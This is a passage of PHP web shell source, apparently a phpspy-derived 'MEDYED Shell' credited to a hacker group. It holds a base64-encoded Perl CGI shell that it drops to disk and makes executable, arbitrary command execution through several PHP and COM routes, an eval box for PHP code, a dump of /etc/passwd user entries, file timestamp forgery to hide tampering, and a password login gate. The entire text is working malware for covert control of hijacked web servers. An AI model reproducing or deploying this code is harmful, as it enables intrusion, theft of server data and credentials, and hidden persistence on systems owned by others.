l7DQoJCSRyZXN1bHQgLj0gICgnPHA+QnlwYXNzIEVkZW1peW9ydW0uIMOcemfDvG7DvG0gcGFucGE8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGUgaWQ9ImRvbWFpbiI+PHRyPjx0aD5Eb21haW5sZXI8L3RoPiA8dGg+S3VsbGFuaWNpbGFyPC90aD48L3RyPic7DQoJfQ0KCWZvcmVhY2ggbXkgJG9uZSAoQGNuenMpDQoJew0KCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQ0KCQl7CQ0KCQkJJHN0eWxlPSAoJHN0eWxlIGVxICJsaW5lIikgPyAibm90bGluZSI6ICJsaW5lIjsNCgkJCSRmaWxlbmFtZT0gdHJpbSgiL2V0Yy92YWxpYXNlcy8iLiQxKTsNCgkJCSRvd25lciA9IGdldHB3dWlkKChzdGF0KCRmaWxlbmFtZSkpWzRdKTsNCgkJCSRyZXN1bHQgLj0gJzx0ciBzdHlsZT0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiQxLiciIHRhcmdldD0iX2JsYW5rIj4nLiQxLic8L2E+PC90ZD48dGQ+ICcuJG93bmVyLic8L3RkPjwvdHI+JzsNCgkJfQ0KCX0NCgkkcmVzdWx0IC49ICc8L3RhYmxlPic7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFZpZXcgTG9nDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0xvZw0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglpZigkV2luTlQpDQoJew0KCQlyZXR1cm4gIjxoMj48Zm9udCBzdHlsZT0nZm9udDogMjBwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+V2luZG93c2RhIENhbGlzdGlybWF5aW48L2ZvbnQ+PC9oMj4iOw0KCX0NCglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOw0KCW15IEBwYXRobG9nPSgJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywNCgkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2cnLA0KCQkJJy91c3IvbG9jYWwvYXBhY2hlMi9jb25mL2h0dHBkLmNvbmYnLA0KCQkJJy92YXIvbG9nL2h0dHBkL2Vycm9yX2xvZycsDQoJCQknL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9zdXBocF9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3Mvc3RhdHNfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2FjY2Vzc19sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvZXJyb3JfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2xpY2Vuc2VfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2xvZ2luX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLA0KCQkJJy92YXIvY3BhbmVsL2NwYW5lbC5jb25maWcnLA0KCQkJJy91c3IvbG9jYWwvcGhwL2xpYi9waHAuaW5pJywNCgkJCScvdXNyL2xvY2FsL3BocDUvbGliL3BocC5pbmknLA0KCQkJJy92YXIvbG9nL215c3FsL215c3FsLWJpbi5sb2cnLA0KCQkJJy92YXIvbG9nL215c3FsLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWxkZXJyb3IubG9nJywNCgkJCScvdmFyL2xvZy9teXNxbC9teXNxbC5sb2cnLA0KCQkJJy92YXIvbG9nL215c3FsL215c3FsLXNsb3cubG9nJywNCgkJCScvdmFyL215c3FsLmxvZycsDQoJCQknL3Zhci9saWIvbXlzcWwvbXkuY25mJywNCgkJCScvZXRjL215c3FsL215LmNuZicsDQoJCQknL2V0Yy9teS5jbmYnLA0KCQkJKTsNCglteSAkaT0wOw0KCW15ICRwZXJtczsNCglteSAkc2w7DQoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykNCgl7DQoJCWlmKC1yICRsb2cpDQoJCXsNCgkJCSRwZXJtcz0iT0siOw0KCQl9ZWxzZQ0KCQl7DQoJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+SXB0YWw8Zm9udD4iOw0KCQl9DQoJCSRyZXN1bHQgLj08PEVORDsNCgkJPHRyPg0KDQoJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBvblN1Ym1pdD0iRW5jb2RlcignbG9nJGknKSI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIGlkPSJsb2ckaSIgbmFtZT0iYyIgdmFsdWU9InRhaWwgLTEwMDAwICRsb2cgfCBncmVwICcvaG9tZSciIHNpemU9JzUwJy8+PC90ZD4NCgkJCTx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVuZSBQYW5wYSIgLz48L3RkPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiIC8+DQoJCQk8L2Zvcm0+DQoJCQk8dGQ+JHBlcm1zPC90ZD4NCg0KCQk8L3RyPg0KRU5EDQoJCSRpKys7DQoJfQ0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9IGRlY29kZV9iYXNlNjQoJGlueydjJ30pOw0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCiRBY3Rpb24gPSAkaW57J2EnfTsNCg0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICZUcmltU2xhc2hlcyhkZWNvZGVfYmFzZTY0KHRyaW0oJGlueydkJ30pKSk7DQojIG1hYyBkaW5oIHh1YXQgdGhvbmcgdGluIG5ldSBrbyBjbyBsZW5oIG5hbyENCiRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIiBpZigkUnVuQ29tbWFuZCBlcSAiIik7DQpjaG9tcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOw0KDQokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7DQoNCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAJCSMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KfWVsc2lmKCRBY3Rpb24gZXEgImd1aSIpICMgR1VJIGRpcmVjdG9yeQ0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImQiKTsNCglpZighJFdpbk5UKQ0KCXsNCgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQlpZigkY2htb2QgbmUgMCkNCgkJew0KCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQkJJGZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgkJCWlmKGNobW9kKCRjaG1vZCwkZmlsZSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFRhbWFtZGlyISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IMOcemfDvG7DvG0hIFBlcm1pc3lvbidhIFNhaGlwIGRlZ2lsc2luISA8L3J1bj48YnI+IjsNCgkJCX0NCgkJfQ0KCX0NCgkkcmVuYW1lPSRpbnsncmVuYW1lJ307DQoJaWYoJHJlbmFtZSBuZSAiIikNCgl7DQoJCWlmKHJlbmFtZSgkVHJhbnNmZXJGaWxlLCRyZW5hbWUpKQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gVGFtYW1kaXIhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gw5x6Z8O8bsO8bSEgUGVybWlzeW9uJ2EgU2FoaXAgZGVnaWxzaW4hIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IEJpdHRpISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IMOcemfDvG7DvG0hIFBlcm1pc3lvbidhIFNhaGlwIGRlZ2lsc2luISA8L3J1bj48YnI+IjsNCgkJCX0JCQkNCgkJfQ0KCX0NCglwcmludCAmTGlzdERpcjsNCg0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic2F2ZSIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHNhdmUgYSBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZigmU2F2ZUZpbGUoJGlueydkYXRhJ30sJGlueydmaWxlJ30pKQ0KCXsNCgkJcHJpbnQgIjxydW4+IEJpdHRpISA8L3J1bj48YnI+IjsNCgl9ZWxzZQ0KCXsNCgkJcHJpbnQgIjxydW4+IMOcemfDvG7DvG0hIFBlcm1pc3lvbidhIFNhaGlwIGRlZ2lsc2luISA8L3J1bj48YnI+IjsNCgl9DQoJcHJpbnQgJkxpc3REaXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmVXBsb2FkRmlsZTsNCn1lbHNpZigkQWN0aW9uIGVxICJiYWNrYmluZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gYmFjayBjb25uZWN0IG9yIGJpbmQgcG9ydA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsNCglwcmludCAmQmFja0JpbmQ7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiYnJ1dGVmb3JjZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gYnJ1dGUgZm9yY2UNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZCcnV0ZUZvcmNlcjsNCn1lbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQoJcHJpbnQgJkRvd25sb2FkRmlsZTsNCn1lbHNpZigkQWN0aW9uIGVxICJjaGVja2xvZyIpIAkJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsb2cgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJlZpZXdMb2c7DQoNCn1lbHNpZigkQWN0aW9uIGVxICJkb21haW5zdXNlciIpIAkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxpc3QgdXNlci9kb21haW4NCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3RG9tYWluVXNlcjsNCn1lbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ0KJlByaW50UGFnZUZvb3Rlcjs=';
$file= fopen("av3.log", "w+");
$write   = fwrite($file, base64_decode($pythonp));
fclose($file);
chmod("av3.log", 0755);
echo "<iframe src=error/av3.log width=100% height=720px frameborder=0></iframe> ";
}elseif ($action == 'etcpwd') {
formhead(array('title'=>'Get /etc/passwd'));
	makehide('action','etcpwd');
	makehide('dir',$nowpath);
$i = 0;
 echo "<p><br><textarea class=\"area\" id=\"phpcodexxx\" name=\"phpcodexxx\" cols=\"100\" rows=\"25\">";
while ($i < 60000) {

    $line = posix_getpwuid($i);
    if (!empty($line)) {

        while (list ($key, $vba_etcpwd) = each($line)){
            echo "".$vba_etcpwd."\n";
            break;
        }

    }

   $i++;
}
  echo "</textarea></p>";
	formfoot();
}elseif ($action == 'eval') {
	$phpcode = trim($phpcode);
	if($phpcode){
		if (!preg_match('#<\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
		}
		eval("?".">$phpcode<?");
	}
	formhead(array('title'=>'Eval PHP Code'));
	makehide('action','eval');
	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
	p('<p><a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">Get plugins</a></p>');
	formfooter();
}//end eval
elseif ($action == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
	formfooter();
}//end editfile
elseif ($action == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	formhead(array('title'=>'Clone file was last modified time'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Set last modified'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('year:');
	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
}//end newtime

elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		if($program && $parameter) {
			$shell= new COM('Shell.Application');
			$a = $shell->ShellExecute($program,$parameter);
			m('Program run has '.(!$a ? 'success' : 'fail'));
		}
		!$program && $program = 'c:\windows\system32\cmd.exe';
		!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
		formhead(array('title'=>'Execute Program'));
		makehide('action','shell');
		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
		p('</p>');
		formfoot();
	}
	formhead(array('title'=>'Execute Command'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Command','name'=>'command','value'=>$command));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
	p('</p>');
	formfoot();

	if ($command) {
		p('<hr width="100%" noshade /><pre>');
		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$command);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if (is_resource($process)) {
				fwrite($pipes[0], $command."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(execute($command));
		}
		p('</pre>');
	}
}//end shell

elseif ($action == 'phpenv') {
	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
	!$dis_func && $dis_func = 'No';
	$info = array(
		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('Server OS',PHP_OS),
		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 => array('PHP run mode',strtoupper(php_sapi_name())),
		9 => array('The file path',__FILE__),

		10 => array('PHP Version',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('Administrator',$adminmail),
		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 => array('enable_dl',getcfg('enable_dl')),
		16 => array('display_errors',getcfg('display_errors')),
		17 => array('register_globals',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('memory_limit',getcfg('memory_limit')),
		20 => array('post_max_size',getcfg('post_max_size')),
		21 => array('upload_max_filesize',$upsize),
		22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		23 => array('disable_functions',$dis_func),
	);

	if($phpvarname) {
		m($phpvarname .' : '.getcfg($phpvarname));
	}

	formhead(array('title'=>'Server environment'));
	makehide('action','phpenv');
	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();

	$hp = array(0=> 'Server', 1=> 'PHP');
	for($a=0;$a<2;$a++) {
		p('<h2>'.$hp[$a].' &raquo;</h2>');
		p('<ul class="info">');
		if ($a==0) {
			for($i=1;$i<=9;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		} elseif ($a == 1) {
			for($i=10;$i<=23;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		}
		p('</ul>');
	}
}//end phpenv

else {
	m('Undefined Action');
}

?>

</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
	Copyright (C) 2013-2014 <B>!!!PKK HACKERS TEAM!!!</B> - <a href=https://www.facebook.com/medyed.dengesor target=_blank><B>MEDYED</B></a> - <B> KURDSH Hacker - </B>Tum Haklari Saklidir.
</div>
</body>
</noscript>

<?php

/*======================================================
Show info shell
======================================================*/

function m($msg) {
	echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
	echo $msg;
	echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $admin, $timestamp, $_SERVER;
	$key = ($prefix ? $admin['cookiepre'] : '').$key;
	$life = $life ? $life : $admin['cookielife'];
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num > $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page > $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from < 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$to = $page;
				}
			} elseif($to > $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
	}
	return $multipage;
}
// Login page
function loginpage() {
?>

<html>
<head>

<body bgcolor=black background=1.jpg>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>MEDYED Shell  </title>
<style type="text/css">
A:link {text-decoration: none; color: green }
A:visited {text-decoration: none;color:red}
A:active {text-decoration: none}
A:hover {text-decoration: underline; color: green;}
input, textarea, button
{
	font-size: 11pt;
	color: 	#FFFFFF;
	font-family: verdana, sans-serif;
	background-color: #000000;
	border-left: 2px dashed #8B0000;
	border-top: 2px dashed #8B0000;
	border-right: 2px dashed #8B0000;
	border-bottom: 2px dashed #8B0000;
}

</style>

       <BR><BR>
<div align=center >

<div>

<font color=gray>
<br /><br /><br /><br /><br />

<form method="POST" action="">
	<span style="font:20pt tahoma;"> </span><input name="password" type="password" size="30">
	<input type="hidden" name="doing" value="login">
	<input type="submit" value="Giris">
	</form>
<BR>
<?php
echo "".$err_mess."";
?>

	<B><font color=red>






</div>


	</fieldset>



</head>
</html>

<?php
	exit;

}//end loginpage()

function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024);
			}
			@pclose($f);
		}
	}
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr);
}

function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}

// Debug
function debuginfo() {
	global $starttime;
	$mtime = explode(' ', microtime());
	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
	echo 'Processed in '.$totaltime.' second(s)';
}

// Function connect database
function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>Can not connect to MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if (!@mysql_select_db($dbname, $link)) {
			p('<h2>Database selected has error</h2>');
			exit;
		}
	}
	if($link && mysql_get_server_info() > '4.1') {
		if(in_array(strtolower($charset), array('gbk', 'big5', 'utf8'))) {
			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
		}
	}
	return $link;
}

// Array strip
function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

// HTML Strip
function html_clean($content) {
	$content = htmlspecialchars($content);
	$content = str_replace("\n", "<br />", $content);
	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
	return $content;
}

// Chmod
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if (($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif (($mode & 0x8000) === 0x8000) {$type = '-';}
	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}

	$owner['read'] = ($mode & 00400) ? 'r' : '-';
	$owner['write'] = ($mode & 00200) ? 'w' : '-';
	$owner['execute'] = ($mode & 00100) ? 'x' : '-';
	$group['read'] = ($mode & 00040) ? 'r' : '-';
	$group['write'] = ($mode & 00020) ? 'w' : '-';
	$group['execute'] = ($mode & 00010) ? 'x' : '-';
	$world['read'] = ($mode & 00004) ? 'r' : '-';
	$world['write'] = ($mode & 00002) ? 'w' : '-';
	$world['execute'] = ($mode & 00001) ? 'x' : '-';

	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}

	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)	{
	if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if ($array && is_array($array)) {
			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
